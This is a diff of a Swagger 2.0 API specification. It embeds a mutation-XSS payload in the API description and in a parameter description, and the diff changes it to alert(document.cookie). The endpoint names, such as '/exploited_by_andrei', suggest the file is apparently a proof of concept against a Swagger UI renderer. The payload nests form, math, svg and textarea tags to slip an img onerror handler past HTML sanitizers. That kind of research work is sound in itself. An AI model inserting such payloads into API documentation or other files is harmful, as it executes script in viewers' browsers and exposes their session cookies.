@@ -3,7 +3,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert("XSS") src=1>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
 
   version: production
 basePath: https://cybecs.com
@@ -16,20 +16,20 @@ consumes:
 security:
 - basicAuth: []
 paths:
-  "/Andrei":
+  "/andrei":
     get:
       responses:
         '200':
           description: No response was specified
       tags:
-      - Mathis Pais De Sousa
+      - Andrei from Cybecs
       operationId: findAccounts
       summary: this is example text
-  "/exploited_by_Andrei":
+  "/exploited_by_andrei":
     delete:
       parameters:
       - description: |
-          <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert("XSS") src=1>"></form>
+          <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
 
         format: int64
         in: path
